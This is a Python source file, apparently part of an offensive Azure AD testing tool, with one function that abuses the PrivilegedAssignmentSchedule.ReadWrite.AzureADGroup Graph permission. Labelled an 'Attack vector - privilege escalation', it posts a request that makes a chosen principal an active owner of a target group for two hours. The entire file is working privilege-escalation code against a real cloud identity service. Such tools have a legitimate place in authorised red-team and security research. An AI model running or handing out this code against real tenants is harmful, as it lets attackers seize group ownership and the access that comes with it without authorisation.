import requests
import colorama
from colorama import Fore, Style
from datetime import datetime, timedelta

def GroupPIM_Vectors(request_headers, GPIMSettings):
    print()
    print(
        "PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup - Allows the app to read, create, and delete time-based assignment schedules for access to Azure AD groups, without a signed-in user.")
    print()
    try:
        print("Attack vector - privilege escalation")

        create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/privilegedAccess/group/assignmentScheduleRequests"
        current_time = datetime.now()
        two_hour_delta = timedelta(hours=2) # for some reason, it puts it 2 hours from now.
        updated_time = current_time - two_hour_delta
        formatted_time = updated_time.strftime("%Y-%m-%dT%H:%M:%SZ")
        message_obj = {
          "accessId": "owner",
          "principalId": GPIMSettings["principal"],
          "groupId": GPIMSettings["groupId"],
          "action": "adminAssign",
          "scheduleInfo": {
            "startDateTime": formatted_time,
            "expiration": {
              "type": "afterDuration",
              "duration": "PT2H"
            }
          },
          "justification": "Assign active owner access."
        }

        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
        print(result.text)
        if result.status_code == 201:
            print(Fore.GREEN + "added " + GPIMSettings["principal"] + " to " + GPIMSettings["groupId"] )
            print(Style.RESET_ALL)

    except:
        pass
